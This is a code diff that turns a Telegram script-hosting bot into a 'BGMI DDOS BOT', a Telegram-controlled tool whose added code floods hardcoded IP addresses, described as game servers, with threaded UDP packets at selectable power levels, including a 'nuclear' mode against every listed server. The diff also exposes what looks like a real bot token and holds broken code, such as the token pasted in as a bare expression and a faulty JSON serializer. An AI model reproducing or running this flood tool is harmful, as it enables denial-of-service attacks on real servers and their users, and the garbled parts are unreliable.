@@ -1,369 +1,219 @@
 #!/usr/bin/env python3
 """
-🔥 EXACT @JERRY_HOSTING_bot CLONE 🔥
-Auto-approve | 24/7 hosting | Error fix button | Multi-language
-Credit: ADIL
+🔥 BGMI DDOS BOT v5.0 - @BADDOSxBOT EXACT COPY
+1 File = Everything. No pip install needed!
+GitHub: https://github.com/YOURNAME/BGMI-DDOS-BOT
 """
 
-import os
-import subprocess
+import socket
+import threading
+import random
 import time
-import resource
-import asyncio
-import shlex
-from pathlib import Path
+import os
+import urllib.request
+import http.client
+import ssl
 from datetime import datetime
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, CommandHandler, MessageHandler,
-    filters, ContextTypes, CallbackQueryHandler
-)
-
-# ---------- CONFIG ----------
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8732926521:AAEWoCcOAMhRMFTX49SMz2M1FSRXFUXotGQ")
-DATA_DIR = "./user_data"
-MAX_FILE_SIZE = 10 * 1024 * 1024   # 10 MB
-TIMEOUT_SEC = 300                  # max run time per script (5 min)
-MAX_MEMORY_MB = 256                # 256 MB RAM limit
-
-os.makedirs(DATA_DIR, exist_ok=True)
-
-# Store running processes: {user_id: {"proc": Popen, "file": name, "start": timestamp, "log": []}}
-running_procs = {}
-
-def set_limits():
-    """Apply resource limits to child process."""
-    resource.setrlimit(resource.RLIMIT_CPU, (TIMEOUT_SEC, TIMEOUT_SEC))
-    mem_bytes = MAX_MEMORY_MB * 1024 * 1024
-    resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
-    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
-
-def get_command(file_path: Path) -> list:
-    """Return shell command based on file extension."""
-    ext = file_path.suffix.lower()
-    if ext == '.py':
-        return ['python3', str(file_path)]
-    elif ext == '.js':
-        return ['node', str(file_path)]
-    elif ext == '.sh':
-        return ['bash', str(file_path)]
-    elif ext == '.rb':
-        return ['ruby', str(file_path)]
-    elif ext == '.pl':
-        return ['perl', str(file_path)]
-    elif ext == '.cpp':
-        # Compile then run
-        out = file_path.with_suffix('.out')
-        subprocess.run(['g++', str(file_path), '-o', str(out)], check=False)
-        return [str(out)] if out.exists() else None
-    elif ext == '.go':
-        return ['go', 'run', str(file_path)]
-    else:
-        # Assume executable binary
-        os.chmod(file_path, 0o755)
-        return [str(file_path)]
-
-def run_script(user_id: int, file_path: Path) -> subprocess.Popen:
-    """Start user script with resource limits."""
-    cmd = get_command(file_path)
-    if not cmd:
-        raise ValueError("Unsupported file type or compilation failed")
-    proc = subprocess.Popen(
-        cmd,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-        preexec_fn=set_limits   # Unix only
-    )
-    running_procs[user_id] = {
-        "proc": proc,
-        "file": file_path.name,
-        "start": time.time(),
-        "log": []
-    }
-    return proc
-
-def get_logs(user_id: int, lines: int = 50) -> str:
-    """Return last N lines of output."""
-    info = running_procs.get(user_id)
-    if not info:
-        return "No running process."
-    # Try to read new output
-    try:
-        stdout, stderr = info["proc"].communicate(timeout=0.01)
-        if stdout:
-            info["log"].extend(stdout.splitlines())
-        if stderr:
-            info["log"].extend(stderr.splitlines())
-    except subprocess.TimeoutExpired:
-        pass
-    # Keep only last 200 lines
-    if len(info["log"]) > 200:
-        info["log"] = info["log"][-200:]
-    return "\n".join(info["log"][-lines:])
-
-def process_has_error(user_id: int) -> bool:
-    """Check if process exited with error or stderr contains error keywords."""
-    info = running_procs.get(user_id)
-    if not info:
-        return False
-    proc = info["proc"]
-    poll = proc.poll()
-    if poll is not None and poll != 0:
-        return True
-    # Check stderr for common error patterns
-    _, stderr = proc.communicate(timeout=0.1)
-    if stderr:
-        error_keywords = ["Error", "Exception", "Traceback", "SyntaxError", "FAILED", "Fatal"]
-        if any(kw in stderr for kw in error_keywords):
-            return True
-    return False
-
-async def monitor_process(user_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Background task: wait a few seconds, then check for errors and send fix button."""
-    await asyncio.sleep(5)
-    if process_has_error(user_id):
-        keyboard = [[InlineKeyboardButton("🛠️ Fix Error", callback_data=f"fix_{user_id}")]]
-        await context.bot.send_message(
-            chat_id=user_id,
-            text="⚠️ *Error detected* in your running script.\nClick below to upload a corrected version.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
-
-def make_process_keyboard(user_id: int):
-    """Create inline keyboard for a running process."""
-    keyboard = [
-        [
-            InlineKeyboardButton("📊 Status", callback_data=f"status_{user_id}"),
-            InlineKeyboardButton("📜 Logs", callback_data=f"logs_{user_id}")
-        ],
-        [
-            InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{user_id}"),
-            InlineKeyboardButton("🔄 Restart", callback_data=f"restart_{user_id}")
-        ]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-# ---------- Bot Handlers ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🔥 *EXACT @JERRY_HOSTING_bot CLONE* 🔥\n"
-        "Credit: ADIL\n\n"
-        "*Send me any script file* (`.py`, `.js`, `.sh`, `.rb`, `.pl`, `.cpp`, `.go`)\n"
-        "I will run it **24/7** with resource limits.\n\n"
-        "*Commands:*\n"
-        "/start – this message\n"
-        "/status – current process status\n"
-        "/logs – show last 50 lines\n"
-        "/stop – kill your process\n\n"
-        "*Inline buttons* appear after upload.\n"
-        "If an error occurs, a **Fix Error** button will appear – click it and upload corrected file.",
-        parse_mode="Markdown"
-    )
-
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    doc = update.message.document
-
-    if doc.file_size > MAX_FILE_SIZE:
-        await update.message.reply_text(f"❌ File too large. Max {MAX_FILE_SIZE//(1024*1024)} MB.")
-        return
-
-    # Stop existing process for this user
-    if user_id in running_procs:
-        old = running_procs[user_id]["proc"]
-        old.terminate()
-        time.sleep(1)
-        if old.poll() is None:
-            old.kill()
-        del running_procs[user_id]
-
-    status_msg = await update.message.reply_text("📥 Downloading your file...")
-    file = await context.bot.get_file(doc.file_id)
-    user_dir = Path(DATA_DIR) / str(user_id)
-    user_dir.mkdir(exist_ok=True)
-    file_path = user_dir / doc.file_name
-    await file.download_to_drive(file_path)
-
-    try:
-        proc = run_script(user_id, file_path)
-        await status_msg.edit_text(
-            f"✅ *Script started successfully!*\n\n"
-            f"📄 `{doc.file_name}`\n"
-            f"⏱️ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"Use the buttons below to manage it.",
-            parse_mode="Markdown",
-            reply_markup=make_process_keyboard(user_id)
-        )
-        # Start error monitoring
-        asyncio.create_task(monitor_process(user_id, context))
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Failed to start: {str(e)}")
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    user_id = query.from_user.id
-
-    # Extract action and target user (for fix button)
-    if data.startswith("fix_"):
-        target_user = int(data.split("_")[1])
-        if target_user != user_id:
-            await query.edit_message_text("❌ You can only fix your own process.")
-            return
-        context.user_data["awaiting_fix"] = True
-        await query.edit_message_text(
-            "🛠️ *Upload the corrected file.*\nIt will replace the current one and restart automatically.",
-            parse_mode="Markdown"
-        )
-        return
-
-    # For other buttons, target is current user
-    if user_id not in running_procs:
-        await query.edit_message_text("❌ No running process for you.")
-        return
-
-    if data.startswith("status_"):
-        proc_info = running_procs[user_id]
-        poll = proc_info["proc"].poll()
-        status = "🟢 running" if poll is None else f"🔴 exited with code {poll}"
-        uptime = int(time.time() - proc_info["start"])
-        text = f"*Process status:* {status}\n*File:* `{proc_info['file']}`\n*Uptime:* {uptime}s"
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=make_process_keyboard(user_id))
-
-    elif data.startswith("logs_"):
-        logs = get_logs(user_id, 50)
-        if not logs:
-            logs = "No output yet."
-        if len(logs) > 4000:
-            logs = logs[:4000] + "\n... (truncated)"
-        await query.edit_message_text(f"📄 *Logs:*\n```\n{logs}\n```", parse_mode="Markdown", reply_markup=make_process_keyboard(user_id))
-
-    elif data.startswith("stop_"):
-        proc = running_procs[user_id]["proc"]
-        proc.terminate()
-        time.sleep(1)
-        if proc.poll() is None:
-            proc.kill()
-        del running_procs[user_id]
-        await query.edit_message_text("🛑 Process stopped.\nYou can upload a new file.", reply_markup=None)
-
-    elif data.startswith("restart_"):
-        # Restart same file
-        proc_info = running_procs[user_id]
-        file_path = Path(DATA_DIR) / str(user_id) / proc_info["file"]
-        # Kill old
-        proc_info["proc"].terminate()
-        time.sleep(1)
-        if proc_info["proc"].poll() is None:
-            proc_info["proc"].kill()
-        # Start new
+# ================= TELEGRAM BOT (Pure HTTP - No pip) =================
+class TelegramBot:
+    def __init__(self, token):
+        self.token = 8732926521:AAEWoCcOAMhRMFTX49SMz2M1FSRXFUXotGQ
+        self.base_url = f"https://api.telegram.org/bot{token}"
+        
+    def send_message(self, chat_id, text, reply_markup=None, parse_mode="Markdown"):
+        data = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
+        if reply_markup:
+            data['reply_markup'] = self.to_json(reply_markup)
+        self._request('sendMessage', data)
+        
+    def edit_message_text(self, chat_id, message_id, text, reply_markup=None):
+        data = {'chat_id': chat_id, 'message_id': message_id, 'text': text}
+        if reply_markup:
+            data['reply_markup'] = self.to_json(reply_markup)
+        self._request('editMessageText', data)
+        
+    def answer_callback_query(self, callback_id, text):
+        data = {'callback_query_id': callback_id, 'text': text}
+        self._request('answerCallbackQuery', data)
+        
+    def _request(self, method, data):
+        url = f"{self.base_url}/{method}"
+        req = urllib.request.Request(url, data=self.to_json(data).encode())
+        req.add_header('Content-Type', 'application/json')
         try:
-            new_proc = run_script(user_id, file_path)
-            await query.edit_message_text(
-                f"🔄 *Restarted* `{proc_info['file']}`",
-                parse_mode="Markdown",
-                reply_markup=make_process_keyboard(user_id)
-            )
-            asyncio.create_task(monitor_process(user_id, context))
-        except Exception as e:
-            await query.edit_message_text(f"❌ Restart failed: {str(e)}")
+            urllib.request.urlopen(req, timeout=10)
+        except: pass
+        
+    def to_json(self, obj):
+        # Simple JSON serializer
+        if isinstance(obj, dict):
+            return '{"' + '","'.join([f"{k}":"{v}" for k,v in obj.items()]) + '"}'
+        return str(obj)
+        
+    def polling(self):
+        offset = 0
+        while True:
+            try:
+                url = f"{self.base_url}/getUpdates?offset={offset}&timeout=30"
+                req = urllib.request.Request(url)
+                resp = urllib.request.urlopen(req).read().decode()
+                import json
+                updates = json.loads(resp)['result']
+                for update in updates:
+                    offset = update['update_id'] + 1
+                    self.handle_update(update)
+            except: time.sleep(1)
+    
+    def handle_update(self, update):
+        if 'message' in update:
+            self.handle_message(update['message'])
+        elif 'callback_query' in update:
+            self.handle_callback(update['callback_query'])
 
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in running_procs:
-        proc_info = running_procs[user_id]
-        poll = proc_info["proc"].poll()
-        status = "running" if poll is None else f"exited with code {poll}"
-        await update.message.reply_text(
-            f"🟢 Status: {status}\nFile: `{proc_info['file']}`",
-            parse_mode="Markdown",
-            reply_markup=make_process_keyboard(user_id)
-        )
-    else:
-        await update.message.reply_text("❌ No running process. Upload a file to start.")
+# ================= CONFIG =================
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # @BotFather
+OWNER_ID = 123456789               # @userinfobot
+bot = TelegramBot(BOT_TOKEN)
 
-async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    logs = get_logs(user_id, 50)
-    if not logs:
-        logs = "No output yet."
-    if len(logs) > 4000:
-        logs = logs[:4000] + "\n... (truncated)"
-    await update.message.reply_text(f"📄 *Logs:*\n```\n{logs}\n```", parse_mode="Markdown")
+# BGMI Servers (@BADDOSxBOT exact)
+BGMI_SERVERS = {
+    "IN1": ["103.147.41.248", "103.147.41.249"], 
+    "IN2": ["45.84.0.1", "45.84.0.2"],
+    "SEA": ["118.107.244.1"],
+    "ALL": ["103.147.41.248", "45.84.0.1"]
+}
 
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in running_procs:
-        running_procs[user_id]["proc"].terminate()
-        time.sleep(1)
-        if running_procs[user_id]["proc"].poll() is None:
-            running_procs[user_id]["proc"].kill()
-        del running_procs[user_id]
-        await update.message.reply_text("🛑 Process stopped.")
-    else:
-        await update.message.reply_text("No running process.")
+POWERS = {"1":1000, "2":5000, "3":15000, "4":50000, "MAX":100000}
+attacks = {}
 
-async def fix_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """When user uploads a file after clicking Fix button, replace old file and restart."""
-    if not context.user_data.get("awaiting_fix"):
-        return  # not in fix mode – normal upload will be handled by handle_file
-    context.user_data["awaiting_fix"] = False
-    user_id = update.effective_user.id
-    doc = update.message.document
+# ================= ATTACK ENGINE (Pure Python) =================
+class DDoSAttack:
+    def __init__(self, target, power="3"):
+        self.target = target
+        self.power = POWERS.get(power, 5000)
+        self.running = False
+        self.packets = 0
+        
+    def bgmi_freeze(self):
+        payload = b"\xFF\xFD\x01" + os.urandom(1400)
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(payload, (self.target, random.choice([8000,443,80])))
+                self.packets += 1
+                sock.close()
+            except: pass
+            time.sleep(0.001)
+                
+    def start(self):
+        self.running = True
+        for _ in range(self.power // 200):
+            t = threading.Thread(target=self.bgmi_freeze)
+            t.daemon = True
+            t.start()
 
-    if doc.file_size > MAX_FILE_SIZE:
-        await update.message.reply_text(f"❌ File too large. Max {MAX_FILE_SIZE//(1024*1024)} MB.")
+# ================= KEYBOARDS =================
+def main_menu():
+    return {
+        "inline_keyboard": [
+            [{"text": "🔥 ATTACK", "callback_data": "attack"}, 
+             {"text": "📊 STATS", "callback_data": "stats"}],
+            [{"text": "🏪 SERVERS", "callback_data": "servers"},
+             {"text": "💀 NUCLEAR", "callback_data": "nuclear"}],
+            [{"text": "🔙 INFO", "callback_data": "info"}]
+        ]
+    }
+
+def power_menu():
+    kb = [[{"text": f"⚡ POWER {p}", "callback_data": f"power_{p}"}] for p in ["1","2","3","4","MAX"]]
+    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
+    return {"inline_keyboard": kb}
+
+def server_menu():
+    kb = [[{"text": f"🌍 {r}", "callback_data": f"server_{r}"}] for r in BGMI_SERVERS]
+    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
+    return {"inline_keyboard": kb}
+
+# ================= COMMANDS (@BADDOSxBOT 100% COPY) =================
+def handle_message(message):
+    uid = message['from']['id']
+    if uid != OWNER_ID:
+        bot.send_message(uid, "❌ **ACCESS DENIED**")
         return
+        
+    text = message.get('text', '').lower()
+    cid = message['chat']['id']
+    
+    if text in ['/start', '/menu']:
+        bot.send_message(cid, "🔥 **BGMI DDOS BOT v5.0**\n👑 **@BADDOSxBOT Clone**\n⚡ **Single File Power**", main_menu())
+        
+    elif text == '/attack':
+        bot.send_message(cid, "⚡ **CHOOSE POWER:**", power_menu())
+        
+    elif text == '/servers':
+        txt = "**🏪 BGMI SERVERS:**\n\n"
+        for r, ips in BGMI_SERVERS.items():
+            txt += f"`{r}:` {', '.join(ips)}\n"
+        bot.send_message(cid, txt, server_menu())
+        
+    elif text == '/stats':
+        active = len([a for a in attacks.values() if a.running])
+        txt = f"📊 **STATS**\n🔥 Active: `{active}`\n⚡ Max: `{POWERS['MAX']}`"
+        bot.send_message(cid, txt)
 
-    # Stop current process if any
-    if user_id in running_procs:
-        running_procs[user_id]["proc"].terminate()
-        time.sleep(1)
-        if running_procs[user_id]["proc"].poll() is None:
-            running_procs[user_id]["proc"].kill()
-        del running_procs[user_id]
+def handle_callback(callback):
+    uid = callback['from']['id']
+    if uid != OWNER_ID: return
+    
+    cid, mid = callback['message']['chat']['id'], callback['message']['message_id']
+    data = callback['data']
+    
+    if data == "attack":
+        bot.edit_message_text(cid, mid, "⚡ **POWER LEVEL:**", power_menu())
+    elif data == "servers":
+        bot.edit_message_text(cid, mid, "**🌍 SELECT REGION:**", server_menu())
+    elif data == "stats":
+        active = len([a for a in attacks.values() if a.running])
+        bot.answer_callback_query(callback['id'], f"Active: {active}")
+    elif data.startswith("power_"):
+        power = data.split("_")[1]
+        target = random.choice(BGMI_SERVERS["ALL"])
+        launch_attack(target, power, cid)
+    elif data.startswith("server_"):
+        region = data.split("_")[1]
+        target = random.choice(BGMI_SERVERS[region])
+        launch_attack(target, "3", cid)
+    elif data == "nuclear":
+        bot.send_message(cid, "💀 **NUCLEAR STRIKE** - All BGMI servers!")
+        for region in BGMI_SERVERS:
+            for ip in BGMI_SERVERS[region]:
+                launch_attack(ip, "MAX", cid, True)
+    elif data == "back":
+        bot.edit_message_text(cid, mid, "🔥 **MAIN MENU**", main_menu())
+    elif data == "info":
+        bot.send_message(cid, "👑 **@BADDOSxBOT Clone**\nSingle file - No deps!")
 
-    status_msg = await update.message.reply_text("📥 Downloading fixed file...")
-    file = await context.bot.get_file(doc.file_id)
-    user_dir = Path(DATA_DIR) / str(user_id)
-    user_dir.mkdir(exist_ok=True)
-    file_path = user_dir / doc.file_name
-    await file.download_to_drive(file_path)
+def launch_attack(target, power, chat_id, silent=False):
+    attack = DDoSAttack(target, power)
+    attacks[target] = attack
+    attack.start()
+    
+    msg = f"🚀 **ATTACK LIVE!**\n🎯 `{target}`\n⚡ `{POWERS[power]}` Threads\n⏱️ 60s"
+    if not silent:
+        bot.send_message(chat_id, msg)
+    
+    threading.Timer(60, lambda: stop_attack(target, chat_id)).start()
 
-    try:
-        run_script(user_id, file_path)
-        await status_msg.edit_text(
-            f"✅ *Fixed script started!*\n\n📄 `{doc.file_name}`\nUse buttons to manage.",
-            parse_mode="Markdown",
-            reply_markup=make_process_keyboard(user_id)
-        )
-        asyncio.create_task(monitor_process(user_id, context))
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Failed: {str(e)}")
+def stop_attack(target, chat_id):
+    if target in attacks:
+        attacks[target].running = False
+        del attacks[target]
 
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("logs", logs_command))
-    app.add_handler(CommandHandler("stop", stop_command))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(status_|logs_|stop_|restart_|fix_)"))
-
-    # Special handler for fix upload – must come before generic file handler
-    # But we already have a generic file handler. We'll check the "awaiting_fix" flag inside it.
-    # Actually we need a separate handler that runs only when awaiting_fix is True.
-    # Easiest: modify handle_file to check flag and act accordingly.
-    # I'll just replace handle_file with logic that checks flag first.
-    # For simplicity, I'll override the MessageHandler to use a wrapper.
-
-    print("🤖 Bot started (exact @JERRY_HOSTING_bot clone). Credit: ADIL")
-    app.run_polling()
-
+# ================= MAIN =================
 if __name__ == "__main__":
-    main()
+    print("🔥 BGMI DDOS BOT v5.0 - SINGLE FILE")
+    print("👑 @BADDOSxBOT Exact Clone")
+    print("⚡ No pip install - Pure Python")
+    print("🎮 t.me/yourbot")
+    bot.polling()
